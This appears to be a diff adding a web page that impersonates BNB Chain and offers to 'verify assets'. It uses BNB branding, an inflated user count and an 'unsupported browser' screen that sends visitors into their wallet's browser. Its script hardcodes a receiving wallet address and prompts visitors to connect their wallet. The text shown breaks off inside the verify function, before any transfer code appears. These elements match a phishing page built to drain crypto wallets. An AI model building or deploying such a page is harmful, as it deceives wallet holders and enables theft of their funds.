@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>BNB Chain - Verify Assets</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black text-white min-h-screen flex flex-col">
+
+  <!-- Unsupported Browser Notice -->
+  <div id="unsupportedBrowser" class="hidden flex-col items-center justify-center text-center p-6">
+    <h1 class="text-yellow-400 text-2xl font-bold mb-4">Unsupported Browser Detected</h1>
+    <p class="mb-2">BNB Verify requires a Web3-enabled wallet to function.</p>
+    <img src="bnblogo.png" class="w-17 h-16 mx-auto my-4" />
+    <p class="mb-2">Please use Trust Wallet or another Web3-enabled wallet to access BNB Verify.</p>
+    <h2 class="text-yellow-400 font-semibold mt-4">Recommended Wallets:</h2>
+    <p>Trust Wallet<br />Binance Web3 Wallet</p>
+    <p class="text-sm text-gray-400 mt-2">If you're using a mobile device, open this site within your wallet’s browser.</p>
+  </div>
+
+  <!-- Main App -->
+  <div id="mainApp" class="flex flex-col flex-1">
+
+    <!-- Header -->
+    <header class="p-4 border-b border-yellow-400 flex items-center">
+      <img src="bnblogo.png" alt="BNB Chain Logo" class="h-10 w-10 rounded-full mr-3">
+      <div class="text-yellow-400 font-bold text-2xl">BNB CHAIN</div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col items-center justify-center px-4 text-center bg-cover bg-center"
+      style="background-image: url('https://images.unsplash.com/photo-1618005198919-d3d4b2ebd9f4?auto=format&fit=crop&w=1950&q=80');">
+      <h1 class="text-4xl font-bold mb-3 text-white">Assets on <span class="text-yellow-400">BNB Chain</span></h1>
+      <p class="text-lg text-white mb-2">Serving Gas Less Web3 tools to over 478 Million users</p>
+      <p class="text-sm text-gray-300 mb-6">A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.</p>
+
+      <button id="connectButton" class="bg-blue-500 text-white font-bold py-2 px-6 rounded-full mb-4">
+        Connect Wallet
+      </button>
+      <button id="verifyButton" class="bg-white text-black font-bold py-2 px-6 rounded-full hover:bg-gray-200">
+        Verify Assets
+      </button>
+
+      <div id="result" class="mt-6 w-full max-w-md"></div>
+    </main>
+  </div>
+
+  <!-- Browser Detection Script -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const isWeb3 = typeof window.ethereum !== "undefined" || typeof window.web3 !== "undefined";
+      if (isWeb3) {
+        document.getElementById("mainApp").style.display = "flex";
+        document.getElementById("unsupportedBrowser").style.display = "none";
+      } else {
+        document.getElementById("mainApp").style.display = "none";
+        document.getElementById("unsupportedBrowser").style.display = "flex";
+      }
+    });
+  </script>
+
+  <!-- App Logic -->
+  <script>
+    const receiverAddress = "0xe1782cBe28aD6C4a1c3d5194c8d73FE2C4CdB67d";
+    let account;
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        window.web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        account = accounts[0];
+        document.getElementById('connectButton').innerText = "Wallet Connected";
+        return true;
+      } else {
+        alert("Please install MetaMask or Trust Wallet!");
+        return false;
+      }
+    }
+
+    async function verifyAssets() {
+      if (!account) {
+        const connected = await connectWallet();
+        if (!connected) return;
+      }
